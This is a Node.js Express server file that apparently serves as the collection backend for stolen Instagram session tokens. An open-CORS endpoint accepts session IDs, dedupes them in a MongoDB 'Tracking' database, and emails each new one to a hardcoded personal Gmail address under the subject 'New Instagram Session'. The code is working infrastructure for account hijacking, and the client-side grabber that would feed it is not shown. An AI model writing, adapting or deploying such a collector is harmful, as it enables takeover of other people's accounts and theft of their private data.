const express = require("express");
const mongoose = require("mongoose");
const nodemailer = require("nodemailer");
const cors = require("cors");
const bodyParser = require("body-parser");
const dotenv = require("dotenv");
dotenv.config({ path: "./.env" });

const app = express();
app.use(cors());
app.use(bodyParser.json());

// MongoDB Connection
mongoose.connect(
  process.env.MONGODB_URI || "mongodb://127.0.0.1:27017/Tracking",
  {
    useNewUrlParser: true,
    useUnifiedTopology: true,
  }
);

// Session Schema (with TTL for auto-cleanup)
const sessionSchema = new mongoose.Schema({
  sessionId: { type: String, unique: true },
  createdAt: { type: Date, expires: "30m", default: Date.now }, // Auto-delete after 30 mins
});
const Session = mongoose.model("Session", sessionSchema);

// Email Transporter
const transporter = nodemailer.createTransport({
  service: "gmail",
  auth: {
    user: process.env.EMAIL_USER,
    pass: process.env.EMAIL_PASS,
  },
});

// API Endpoint
app.post("/api/send-session", async (req, res) => {
  const { sessionId } = req.body;

  if (!sessionId) {
    return res.status(400).json({ error: "Session ID required" });
  }

  try {
    // Atomic "findOrCreate" operation
    const existingSession = await Session.findOneAndUpdate(
      { sessionId },
      { $setOnInsert: { sessionId } },
      { upsert: true, new: false }
    );

    // If document existed already (duplicate)
    if (existingSession) {
      return res.json({ success: false, message: "Duplicate session" });
    }

    // Send email (only for new sessions)
    await transporter.sendMail({
      from: process.env.EMAIL_USER,
      to: "sufi9594@gmail.com",
      subject: "New Instagram Session",
      text: `Session ID: ${sessionId}`,
    });

    res.json({ success: true });
  } catch (error) {
    console.error("Error:", error);
    res.status(500).json({ error: "Server error" });
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
